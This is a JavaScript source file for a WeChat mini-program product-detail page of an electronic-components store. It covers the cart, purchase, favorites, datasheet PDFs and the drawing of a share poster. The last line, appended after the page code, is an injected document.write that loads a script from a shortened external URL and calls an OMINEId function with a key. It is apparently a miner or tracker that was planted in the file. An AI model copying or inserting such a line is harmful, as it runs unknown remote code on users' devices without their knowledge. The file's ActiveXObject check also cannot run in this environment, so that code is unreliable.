var t = getApp(),
  app=t,
  e = t.requirejs("core"),
  a = (t.requirejs("icons"), t.requirejs("foxui")),
  o = t.requirejs("biz/diyform"),
  i = t.requirejs("jquery"),
  jq = i,
  wxParse = t.requirejs("wxParse/wxParse"),
  n = 0,
  r = [],
  d = [],
  timer;
Page({
  data: {
    icons: t.requirejs("icons"),
    wxCharimg: '',
    show:false,
    loading:true,
    isShare:false,
    isBottom:true,
    isImgshare:false,
    isProduct:true,
    ajax_repeat: { buyNow: true, addCart: true, likeactive: true },
    childrenId:"", 
    goods: {},
    indicatorDots: true,
    autoplay: true,
    interval: 5000,
    duration: 500,
    circular: true,
    httpImg: t.globalData.daxinImg,
    active: "",
    slider: "",
    tempname: "",
    info: "active",
    para:"",
    preselltimeend: "",
    presellsendstatrttime: "",
    advWidth: 0,
    dispatchpriceObj: 0,
    now: parseInt(Date.now() / 1000),
    day: 0,
    hour: 0,
    minute: 0,
    second: 0,
    timer: 0,
    discountTitle: "",
    istime: 1,
    istimeTitle: "",
    params: {},
    total: 1,
    optionid: 0,
    defaults: {
      id: 0,
      merchid: 0
    },
    buyType: "",
    pickerOption: {},
    specsData: [],
    specsTitle: "",
    canBuy: "",
    diyform: {},
    showPicker: false,
    pvalOld: [0, 0, 0],
    pval: [0, 0, 0],
    areas: [],
    noArea: true,
    commentObj: { count: { all: 12, good: 20, normal: 30, bad: 50, pic: 40 } },
    commentObjTab: 1,
    loading: false,
    commentEmpty: false,
    commentPage: 1,
    commentLevel: "all",
    commentShow:"false",
    isActive: '1',
    isShadow: false,
    commentList: [{ headimgurl: "../../../static/images/banner.png", nickname: "评论者01", createtime: "2018-07-06 14:29:35", level: 4, content: "非常nice", images: ["../../../static/images/banner.png", "../../../static/images/banner.png"], reply_content: "true", reply_images: ["../../../static/images/banner.png", "../../../static/images/banner.png"], append_content: "你的很中肯", append_reply_images: ["../../../static/images/banner.png", "../../../static/images/banner.png"] }],
    isfavorite:false,
    recommendlist: [{ selected: 1, id: 1, thumb: "/static/images/recommend_left.jpg", goodsid: 123, title: "ME6211C33M5G 盘装", inventory: "100",     detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:.....", optionid: 1, optiontitle: "电源管理", marketprice: 100.00, totalmaxbuy: 50.00, minbuy: 20.00, total: 50.00 }, { selected: 1, id: 1, thumb: "/static/images/recommend_left.jpg", goodsid: 123, title: "ME6211C33M5G 盘装", inventory: "100", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:.....", optionid: 1, optiontitle: "电源管理", marketprice: 100.00, totalmaxbuy: 50.00, minbuy: 20.00, total: 50.00 }],
    cates: { p_sign: "产品型号", brand_name: "产品品牌", cate_name: "产品分类", "package": "封装", voltage_input: "输入电压(V)", voltage_output: "输出电压(V)", current: "电流(A)"/*, volume_length:"体积"*/},
    modal: {
      content: { isContent: true, title: "产品参数", item: [{ title: "品牌", Icontent: "玖隆" }, { title: "品牌", Icontent: "玖隆" }, { title: "类别", Icontent: "LDO" }, { title: "型号", Icontent: "玖隆" }, { title: "封装", Icontent: "玖隆" }, { title: "现货库存", Icontent: "玖隆" }] }, acount: { dish: 1000, isAcount: false, salenum: "455", rangeprice: "0.28", thumb: "/static/images/recommend_left.jpg", total: 0, ispresell: 1, title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", minprice: "54.12", item: [{ title: "管数", Content: "管", total: 0 }, { title: "K数", Content: "k", total: 0 }, { title: "个数", Content: "个", total: 0}] } 
    }
  },
  
  shadowSendData:function(e){
    var Mmodal = this.data.modal;
    var types = this.data.types;
    var _this=this;
    if (types == 1){
      //Mmodal.content.isContent = true;
    } else if (types == "cart"){
      if (Mmodal.acount.total <= 0) {
        wx.showModal({
          title: '温馨提醒',
          content: '请添加数量',
          showCancel: false,
          success: function (res) {
            if (res.confirm) {
            }
          }
        });
        return;
      }; 
      this.addCart(function(){
        wx.showModal({
          title: '加入购物车',
          content: '加入购物车成功',
          confirmText:"去购物车",
          cancelText:"再逛逛",
          success:function(res){
            if(res.confirm){
              wx.switchTab({
                url: '/pages/member/cart/index',
              })
            }else{
              
            }
          }
        })
      });
    }else if(types == "buy"){
      if (Mmodal.acount.total <= 0) {
        wx.showModal({
          title: '温馨提醒',
          content: '请添加数量',
          showCancel: false,
          success: function (res) {
            if (res.confirm) {
            }
          }
        });
        return;
      };
      this.addCart(function () {
        _this.buyNow({productList: [{
          pid: _this.data.goods.id,
          num: _this.data.modal.acount.total,
        }]},function(){
              wx.navigateTo({
                url: '/pages/order/create/index?id=' + _this.data.goods.id,
              })
            });
          
        });
       
    };
      this.setData({
        isShadow:false,
        modal:Mmodal
      });
  },
  closeShodaw:function(){
    this.setData({
      isShadow: false
    });
  },
  showWechart:function(){
      this.setData({
        isShare:true
      });
   // this.getqrCode();
  },
  closeBtn:function(){
    this.setData({
      isShare: false,
      isImgshare:false
    });
  },
  sharePoster:function(){
    var PromoteQrCodes = app.getCache("PromoteQrCodes");
    var goods =this.data.goods;
   // console.log(PromoteQrCodes);
    if (PromoteQrCodes["shareImage" + goods.id]){
      this.setData({
        shareImage: PromoteQrCodes["shareImage" + goods.id],
        isPromoteQrCodes:true
      });
    }else{
      this.getqrCode();
    };
    this.setData({
      isImgshare:true
    });
    
  },
  saveImg:function(){
    var _this=this;
    wx.saveImageToPhotosAlbum({
      filePath: _this.data.shareImage,
      success:function(res) {
        wx.showToast({
          title: '保存成功',
          icon: 'success',
          duration: 800,
          success:function(){
            _this.setData({
              isShare:false,
              isImgshare: false
            });
          }
        })
      }
    })
  },
  likeactive: function (){
    var _this = this;
    var islikeactive=_this.data.ajax_repeat.likeactive;
    if(!islikeactive){return};
    var isfavorite = _this.data.isfavorite;
    _this.setData({
      'ajax_repeat.likeactive':false
    });
    //添加我的收藏
    wx.showLoading({
      title: isfavorite?'取消中':'添加中',
    }); 
    var datas = {
        session_token: t.globalData.session_token,
        show_data: 'myCollect',
        p_id:[_this.data.goods.id],
        action:'action'
    };
    if (isfavorite) { datas.action ="delete"};
    wx.request({
      url: t.globalData.daxin + "/memberCenter/my",
      data: datas,
      method: "POST",
      success: function (res) {
        _this.setData({
          'ajax_repeat.likeactive': true
        });
        wx.hideLoading();
        if ( res.data.statusCode >= 0) {
          wx.showToast({
            title: isfavorite ? "取消成功":"添加成功",
            icon: 'success',
            duration: 2000
          });
          _this.setData({
            isfavorite:isfavorite?false:true
          });
          return;
        } else {
          if (res.data.statusCode == -300 || res.data.statusCode == -500){
            _this.getbindacount();
            return;
          };
          wx.showModal({
            title: '错误提示',
            content: res.data.msg,
            showCancel: false,
            success: function () {
              if (res.confirm) {

              }
            }
          })
        }
      }
    })
  },
  getList:function(cate){
    //相似推荐
    var _this=this;
    wx.request({
      url: t.globalData.daxin + "/product/productList",
      data: {
        session_token: t.globalData.session_token,
        'cate_id': cate,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var recommendlists = [];
          var array = res.data.data.list;
          jq.each(array, function (index, value) {
            var obj = {};
            obj.title = value.p_sign;
            obj.id = value.id;
            obj.detail = value.parameter;
            obj.salenum = value.sell_num > 0 ? value.sell_num : 0;
            obj.store = value.store > 0 ? value.store : 0;
            if (value.img){
              obj.img = value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img);
            }
            obj.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
            recommendlists.push(obj);
            
          });
          //_this.storeRecommand = storeRecommand;
          _this.setData({
            loading:false,
            empty:true,
            recommendlist: recommendlists
          });
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  }
  ,
  itemlist:function(t){
    var Mmodal = this.data.modal;
    var types =1;
    var num = t.currentTarget.dataset.tap;
    if (num == 1) {
      Mmodal.content.isContent = true;
      Mmodal.acount.isAcount = false;  
    } else if (num == 2) {
      Mmodal.content.isContent = false;
      Mmodal.acount.isAcount = true;
    }else if(num == "cart"){
      Mmodal.content.isContent = false;
      Mmodal.acount.isAcount = true;
      types ="cart";
      //this.addCart();
    }else if(num == "buy"){
      Mmodal.content.isContent = false;
      Mmodal.acount.isAcount = true;
      //this.buyNow();
      types = "buy";
    }

    this.setData({
      isShadow: true,
      modal: Mmodal,
      types:types
    });
  },
  addNum:function(e){
    var Mmodal = this.data.modal;
    var good = this.data.goods;
    var num = e.currentTarget.dataset.tap;
    var dish_num = parseFloat(Mmodal.acount.item[0].total);
    var k_num = Mmodal.acount.item[1].total;
    var self_num = Mmodal.acount.item[2].total;
    var dish = parseFloat(Mmodal.acount.min);
   // console.log(good); 
    if(num == 0){
      Mmodal.acount.item[0].total = ++dish_num;
    }else if(num == 1){
      Mmodal.acount.item[1].total = ++k_num;
    }else{
      Mmodal.acount.item[2].total = ++self_num;
    };
    var totals = dish * dish_num + k_num * 1000 + self_num;
    //console.log(this.getPrice(good.rangePrice, totals));
    Mmodal.acount.rangeprice = t.getPrice(good.rangePrice, totals);
    Mmodal.acount.total = totals;
    this.setData({
      modal: Mmodal
    });
  },
  reduce: function (e) {
    var Mmodal = this.data.modal;
    var num = e.currentTarget.dataset.tap;
    var dish_num = Mmodal.acount.item[0].total;
    var k_num = Mmodal.acount.item[1].total;
    var self_num = Mmodal.acount.item[2].total;
    var good = this.data.goods;
    var dish = parseFloat(Mmodal.acount.min);
    if (num == 0) {
      if (dish_num <=0){return;}
      Mmodal.acount.item[0].total = --dish_num;
    } else if (num == 1) {
      if (k_num <= 0) { return; }
      Mmodal.acount.item[1].total = --k_num;
    } else {
      if (self_num <= 0) { return; }     
       Mmodal.acount.item[2].total = --self_num;    }
    var totals = dish * dish_num + k_num * 1000 + self_num;
    Mmodal.acount.total = totals;
    Mmodal.acount.rangeprice = t.getPrice(good.rangePrice, totals);
    this.setData({
      modal: Mmodal
    });
  },
  changeNum: function (e) {
    var Mmodal = this.data.modal;
    var num = e.currentTarget.dataset.tap;
    var dish_num = parseFloat(Mmodal.acount.item[0].total);
    var k_num = Mmodal.acount.item[1].total;
    var self_num = parseFloat(Mmodal.acount.item[2].total) ;
    var dish = parseFloat(Mmodal.acount.min);
    var good = this.data.goods;
    var thisValue = parseFloat(e.detail.value)||0;
    var totals = dish * dish_num + k_num * 1000 + self_num;
    var that = this;
    clearTimeout(timer);
    if (num == 0) { 
      Mmodal.acount.item[0].total = thisValue;
      totals =  (dish * thisValue||0) + k_num * 1000 + self_num;
    } else if (num == 1) {
      Mmodal.acount.item[1].total = thisValue;
      totals =  dish * dish_num + (thisValue * 1000||0) + self_num;
    } else {
      Mmodal.acount.item[2].total = thisValue;
      totals =  dish * dish_num + k_num * 1000 + (thisValue||0);
    }
    Mmodal.acount.total = totals||"";
    Mmodal.acount.rangeprice = t.getPrice(good.rangePrice, totals||0);
    timer = setTimeout(function(){
        that.setData({
          modal: Mmodal
        });
      },800);  
  },
  lower:function(){
   
  },
  srollInto:function(t){
    var num = t.currentTarget.dataset.tap;
    var childrenIds;
    var active ;
    if (num == 1) { 
      active =1;
      childrenIds ="shop";
    } else if (num == 2){
      childrenIds = "tab"
      active = 2;
    } else if (num == 3){
      childrenIds = "recommend";
      active = 3;
    }
    this.setData({
      childrenId: childrenIds,
      isActive:active
    });
  },
  favorite: function (t) {
    var a = this;
    wx.navigateTo({
      url: '/pages/index/index',
    })
  },
  goodsTab: function (t) {
    var a = this,
      o = t.currentTarget.dataset.tap;
    var describe = a.data.goods;
    if ("info" == o)
      this.setData({
        info: "active",
        para: "",
        isProduct:true,
        goodDetailSrc: describe.pruddetail
      });
    else if ("para" == o){
      this.setData({
        info: "",
        isProduct: false,
        para: "active",
        goodDetailSrc: ""
      });
      if (!a.data.goods.pdf){
        return;
      };
      wx.showLoading({
        title: '打开中...',
        success:function(){
          a.openPdf();
        }
      })
    }
    else if ("comment" == o) {
      if (a.setData({
        info: "",
        para: "",
        comment: "active"
      }), a.data.commentList.length > 0)
        return void a.setData({
          loading: false
        });
      a.setData({
        loading: true
      }),
        e.get("goods/get_comment_list", {
          id: a.data.options.id,
          level: a.data.commentLevel,
          page: a.data.commentPage
        }, function (t) {
          t.list.length > 0 ? a.setData({
            loading: false,
            commentList: t.list,
            commentPage: t.page
          }) : a.setData({
            loading: false,
            commentEmpty: true
          })
        })
    }
  },
  openPdf:function(){
    var _this =this;
    wx.downloadFile({
      url: t.globalData.daxinImg+_this.data.goods.pdf,
      success: function (res) {
        //console.log(res)
        var Path = res.tempFilePath              //返回的文件临时地址，用于后面打开本地预览所用
        wx.openDocument({
          filePath: Path,
          success: function (res) {
            wx.hideLoading();
           // console.log('打开文档成功')
          }
        })
      },
      fail: function (res) {
        console.log(res)
      }
    })
  },
  number: function (t) {
    var o = this,
      i = e.pdata(t),
      s = a.number(this, t);
    i.id,
      i.optionid;
    1 == s && 1 == i.value && "minus" == t.target.dataset.action || i.value == i.max && "plus" == t.target.dataset.action || o.setData({
      total: s
    })
  },
  addCart:function(fn,data){
    var _this = this;
    var isaddCart = _this.data.ajax_repeat.addCart;
    if(!isaddCart){return};
    _this.setData({
      'ajax_repeat.likeactive': false
    });
    var ids = [{ pid: _this.data.goods.id,num:_this.data.modal.acount.total}];
  
    wx.request({
      url: t.globalData.daxin + "/basket/basketAction",
      data: {
        session_token: t.globalData.session_token,
        productList: ids,
      },
      method: "POST",
      success: function (res) {
        _this.setData({
          'ajax_repeat.likeactive': true
        });
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg== "success") {
          if(fn){fn(data);};
        } else if (res.data.statusCode == "-300") {
          wx.redirectTo({
            url: '/pages/start/start?reSet=true'
          })
        }else {
          if ( res.data.statusCode == "-500"){
            _this.getbindacount(res);
            return;
          };
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + ',加入购物车失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  getbindacount:function(res){  
    //未绑定用户处理
    var _this=this;
    wx.showModal({
      title: '提示信息',
      content: res.data.msg,
      confirmText: '绑定用户',
      success: function (res) {
        if (res.confirm) {
          wx.redirectTo({
            url: "/pages/member/bind/index"
          })
        } else if (res.cancel) {
          
        }
      }
    });
  },
  buyNow: function (addObj,fn) {
    var _this = this;
    var isbuyNow = _this.data.ajax_repeat.buyNow;
    if(!isbuyNow){return};
    _this.setData({
      "ajax_repeat.buyNow":false
    });
    // wx.showToast({
    //   title: '',
    //   icon: 'loading',
    //   mask: true,
    //   duration: 1000
    // });
    var sendData = {
      session_token: t.globalData.session_token,
      action: "settlement"
    };
    sendData = jq.extend(sendData, addObj);
    //立即购买
    wx.request({
      url: t.globalData.daxin + "/basket/basketAction",
      data: sendData,
      method: "POST",
      success: function (res) {
        _this.setData({
          "ajax_repeat.buyNow": true
        });
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.msg == "success") {
          wx.hideToast();
          if (fn) fn();
        } else if (res.data.statusCode == "-300") {
          wx.redirectTo({
            url: '/pages/start/start?reSet=true'
          })
        } else {
          if ( res.data.statusCode == "-500") {
            _this.getbindacount(res);
            return;
          }
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + ',提交失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  getDetail:function(id,fn){
    var _this=this;
    _this.setData({
      show: true
    })
    //商品列表
    wx.showLoading({
      title: '加载中',
    });
    wx.request({
      url: t.globalData.daxin + "/product/productList",
      data: {
        session_token: t.globalData.session_token,
        pid:id,
        show_data:'productDetail'
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if(fn)fn();
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          // wx.showToast({
          //   title: '成功',
          //   icon: 'success',
          //   duration: 1000
          // });
          var thumbs = [];
          var value = res.data.data.list[0];
          var obj = {};
         // var ispdf = _this.pdfExist(t.globalData.daxinImg+value.pdf);
            obj.goodsType = value.goodsType||"自营";
            obj.title = value.p_sign;
            obj.package = value.package;
            obj.brand_name = value.brand_name;
            obj.cate_name = value.cate_name;
            obj.fitemno = value.cate_name;
            obj.id = value.id;
            obj.pdf =  value.pdf;
            obj.parameter = value.parameter; 
            obj.salenum = value.sell_num > 0 ? value.sell_num : 0;
            obj.stores = value.store > 0 ? value.store : 0;
            if (value.img){
              thumbs.push(value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img));
            }
            var otherImg = value.describe_image ? value.describe_image.split(";"):"";
            if (otherImg){
              jq.each(otherImg,function(index,val){
                thumbs.push(val.indexOf("http") > 0 ? val : (t.globalData.daxinImg + val));
              });
            };
            obj.thumbs = thumbs;
            obj.rangePrice = value.product_price;  
            var array=[];
            var cate = _this.data.cates;
            var Modal = _this.data.modal;
            jq.each(cate,function(index,val){
              if (index.indexOf('voltage') > -1 || index == 'current'){
                if (value[index + '_start'] == 0 && value[index + '_end']==0){
                  array.push({ title: [val], Icontent: "" });
                }else{
                  if (value[index + '_start'] != 0 && value[index + '_end'] == 0){
                    array.push({ title: [val], Icontent: (value[index + '_start'] || "0")/1000});
                  }else {
                    array.push({ title: [val], Icontent: (value[index + '_start'] || "0")/1000 + '~' + (value[index + '_end'] || "0")/1000 });
                  }
                }
              }else{
                if (value[index] ==0){
                  array.push({ title: [val], Icontent: "" });
                }else{
                  array.push({ title: [val], Icontent: value[index] });
                } 
              };
            });
            Modal.content.item=array;
            Modal.acount.title = value.fitemno;
            Modal.acount.thumb = t.globalData.daxinImg+value.img;
            Modal.acount.detail = value.parameter;
            Modal.acount.min = value.min;
            Modal.acount.rangeprice = value.product_price[0].unit_price;
            Modal.acount.item[0].title = value.pack_unit+"数";
            Modal.acount.item[0].Content = value.pack_unit;
            jq.each(value.user_comment, function (ind, val) {
            if (val.images) {
              val.img = val.images.split(";");
              jq.each(val.img, function (id, vl) {
                vl = t.globalData.daxinImg + vl;
              });
            }
          });
          obj.pruddetail = value.describe ? value.describe:"暂无介绍";
          if (value.describe) wxParse.wxParse("wxParseData", "html", _this.getOriginDescribe(value.describe), _this, "5");
          //console.log(wxParse.wxParse("wxParseData", "html", value.describe, _this, "5"));
          var datas = {
            goods: obj,
            modal: Modal,
            commentList: value.user_comment,
            show: true
          };
          if(value.myCollect){
            datas.isfavorite = value.myCollect ==1?true:false;
          };
          _this.setData(datas,function(){
            _this.getList(value.cate_id);
          });
        } else {
          if (res.data.statusCode == "-300") {
            e.getUserInfo(function (event) {
              wx.redirectTo({
                url: "/pages/member/bind/index"
              })
            }, function (data) {
              //wx.startPullDownRefresh();
              _this.getDetail(_this.data.optons.id,function () {
                //wx.stopPullDownRefresh();
              });
            });
            return;
          }
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
 getOriginDescribe:function(describe){
   //还原加密的商品详情
   let _this=this;
   let reg = /(<p>)+|[\u2E80-\u9FFF]+/;///^<([a-z]+)([^<]+)*(?:>(.*)<\/\1>|\s+\/>)$/g;
   let returndata;
   let returnObj = describe;
   if (!describe) { return describe };
   if (!reg.test(describe + "")) {
     returndata = decodeURIComponent(describe + '');
     return _this.getOriginDescribe(returndata);
   } else {
     return returnObj;
   };
   
 },
  pdfExist: function (FileURL) {
    //pdf是否存在
    　　var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    　　 xmlhttp.open("GET", FileURL, false);
         xmlhttp.send();
      if (xmlhttp.readyState == 4) 　　{
        if (xmlhttp.status == 200) return true;
        else if (xmlhttp.status == 404) return false;
        else return false;
    }
  },
  emptyActive: function () {
    this.setData({
      active: "",
      slider: "out"
    })
  },
  onLoad: function (e) {
    var a=this;
    // "" == t.getCache("userinfo") && wx.redirectTo({
    //   url: "/pages/message/auth/index"
    // })
    //e.id=6;
    this.setData({
      option:e,
      wxCharimg: app.globalData.headurl
    });
    this.getDetail(e.id);
    //setTimeout(function () { a.getList();},1000);
  },
  onShow: function () {
  },
  onPullDownRefresh: function () {
    var _this = this;
    var option = _this.data.option;
    //下拉刷新
    _this.getDetail(option.id);
    wx.stopPullDownRefresh();
  },
  getqrCode:function(){
    wx.showLoading({
      title:'图片生成中...',
      icon: 'loading',
      mask: true,
    });
    var than = this;
    //获取手机比例
    wx.getSystemInfo({
      success: function(res) {
        console.log(res);
        if (res.pixelRatio){
          than.setData({
            pixelRatio: res.pixelRatio
          });
        };
      },
    })
    
    wx.request({
      url: t.globalData.daxin + "/file/xcxQRCode",
      method: "POST",
      data: {
        session_token: t.globalData.session_token,
        pid:than.data.goods.id
      },
      success: function (e) {//生成了二维码
        if (e.data.statusCode>=0){
          var qrcode_path = t.globalData.uploadimg + e.data.data.path;

          // wx.downloadFile({
          //   url: 'qrcode_path', //仅为示例，并非真实的资源
          //   success: function (res) {
          //     // 只要服务器有响应数据，就会把响应内容写入文件并进入 success 回调，业务需要自行判断是否下载到了想要的内容
          //     if (res.statusCode === 200) {
          //       wx.playVoice({
          //         filePath: res.tempFilePath
          //       })
          //     }
          //   }
          // }) 
          wx.getImageInfo({
            src: qrcode_path,
            success: function (code) {
              var qrCodePath = code.path;
             // console.log(code);
              //than.drawSharePic(goodsPicPath, qrCodePath);
                wx.getImageInfo({
                  src: than.data.goods.thumbs[0],
                  success: function (res) {
                    //wx.hideLoading();
                    var goodsPicPath = res.path;
                    
                    wx.getImageInfo({
                      src: app.globalData.headurl,
                      complete:function(heads){
                        //console.log(heads);
                        if(heads.path){
                          than.drawSharePic(goodsPicPath, qrCodePath, heads.path);
                        }else{
                          wx.hideLoading();
                          wx.showModal({
                            title: '错误提示',
                            showCancel: false,
                            content: '微信个人图片下载失败',
                            success: function (res) {
                              if (res.confirm) {
                                than.closeBtn();
                              } else if (res.cancel) {
                                console.log('用户点击取消')
                              }
                            }
                          })
                        }
                      }
                    })
                    
                  },
                  complete:function(productImg){
                    if (!productImg.path) {
                      wx.hideLoading();
                      wx.showModal({
                        title: '错误提示',
                        showCancel: false,
                        content: '商品图片下载失败',
                        success: function (res) {
                          if (res.confirm) {
                            than.closeBtn();
                          } else if (res.cancel) {
                            console.log('用户点击取消')
                          }
                        }
                      })
                    };
                  }
                })
            },
            complete:function(allCode){
             // console.log(allCode);
              if(!allCode.path){
                wx.hideLoading();
                wx.showModal({
                  title: '错误提示',
                  showCancel: false,
                  content: '二维码下载失败',
                  success: function (res) {
                    if (res.confirm) {
                      than.closeBtn();
                    } else if (res.cancel) {
                      console.log('用户点击取消')
                    }
                  }
                })
              };
            }
          })

          
      }else{
        wx.hideLoading();
          if (e.data.statusCode == -300){
          than.getbindacount();
          return;
        };
          wx.showLoading({
            title: e.data.msg,
            mask: true,
            duration:1000,
            success:function(){
              than.closeBtn();
            }
          });
      }
        
      }
    });
  },
  /**
     * 绘制分享的图片
     * @param goodsPicPath 商品图片的本地链接
     * @param qrCodePath 二维码的本地链接
     */
  drawSharePic: function (goodsPicPath, qrCodePath, headurl) {
    //console.log(goodsPicPath, qrCodePath, headurl);
        var _this = this;
        var goods =this.data.goods;
        //y方向的偏移量，因为是从上往下绘制的，所以y一直向下偏移，不断增大。
        let yOffset = 20;
        var goods =this.data.goods;
        const p_sign = goods.title||'型号：MT3608-SOT23-6';
        const pack = '封装：' + goods.package||'盘装 一盘3000PCS';
        const brand_name = '品牌：' + goods.brand_name||'无';
        const cate_name = '分类：' + goods.cate_name || '无';
        var priceArray=[];
        jq.each(goods.rangePrice,function(ind,val){
          priceArray.push(val.lft_num + "-" + val.right_num + (ind == 2 ?"以上":"")+":" + val.unit_price + "/PCS （含税）") ;
        });
        var price = '价格区间：' + priceArray[0];
        var price2 = priceArray[1] || "";
        var price3 = priceArray[2] || "";
        const note = '长按识别小程序码查看详情';

        const canvasCtx = wx.createCanvasContext('shareCanvas');
        //绘制背景
        canvasCtx.setFillStyle('white');
        canvasCtx.fillRect(0, 0, 320, 440);
        //绘制分享的标题文字
        canvasCtx.setFontSize(15);
        canvasCtx.setFillStyle('#000');
        //绘制商品图片
        canvasCtx.drawImage(goodsPicPath, 15, 10, 150, 150);

        //绘制商品型号
        canvasCtx.fillText(p_sign, 28, 180);
        canvasCtx.setFontSize(10);
        canvasCtx.setFillStyle('#000');
        canvasCtx.fillText(brand_name, 28, 200);
        canvasCtx.fillText(pack, 28, 220);
        canvasCtx.fillText(cate_name, 28, 240);
        canvasCtx.fillText(price, 28, 260);
        canvasCtx.fillText(price2, 61, 280);
        canvasCtx.fillText(price3, 61, 300);

        canvasCtx.setFillStyle('#F5F5F5')
        canvasCtx.fillRect(0, 320, 320, 140)
      
        canvasCtx.drawImage(headurl, 28, 340, 30, 30);
        //绘制个人信息
        canvasCtx.setFillStyle('#323')
        canvasCtx.fillText(app.globalData.nickName, 70, 360);
        canvasCtx.setFontSize(20);
        canvasCtx.fillText("分享给你玖隆芯城", 28, 400);
        canvasCtx.setFontSize(15);
        canvasCtx.setFillStyle('#000')
        canvasCtx.fillText("长按识别小程序二维码", 28, 420);
    
        //绘制二维码
        canvasCtx.drawImage(qrCodePath, 200, 340, 100, 100);
        canvasCtx.draw();
        //wx.hideLoading();
        //绘制之后加一个延时去生成图片，如果直接生成可能没有绘制完成，导出图片会有问题。
        setTimeout(function () {
          var width = 320, height = 440, pixelRatio = _this.data.pixelRatio;
          wx.canvasToTempFilePath({
            x: 0,
            y: 0,
            width: width,
            height: height,
            destWidth: width * pixelRatio,
            destHeight: height * pixelRatio,
            canvasId: 'shareCanvas',
            success: function (res) {
              var caches ={};
              caches["shareImage" + goods.id] = res.tempFilePath;
              app.setCache("PromoteQrCodes", caches, 7200);
              _this.setData({
                shareImage: res.tempFilePath,
                showSharePic: true
              })
              wx.hideLoading();
            },
            fail: function (res) {
              console.log(res)
              wx.hideLoading();
            }
          })
        }, 200);
      },
  onChange: function (t) {
    return o.onChange(this, t)
  },
  DiyFormHandler: function (t) {
    return o.DiyFormHandler(this, t)
  },
  selectArea: function (t) {
    return o.selectArea(this, t)
  },
  bindChange: function (t) {
    return o.bindChange(this, t)
  },
  onCancel: function (t) {
    return o.onCancel(this, t)
  },
  onConfirm: function (t) {
    return o.onConfirm(this, t)
  },
  getIndex: function (t, e) {
    return o.getIndex(t, e)
  },
  onShareAppMessage: function () {
    var goods = this.data.goods;
    return {
      title: goods.title,
      path: '/pages/goods/detail/index?id=' + this.data.goods.id,
      imageUrl: goods.thumbs[0]
    }
    //return e.onShareAppMessage("/pages/goods/detail/index?id=" + this.data.goods.id)
  },
  
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
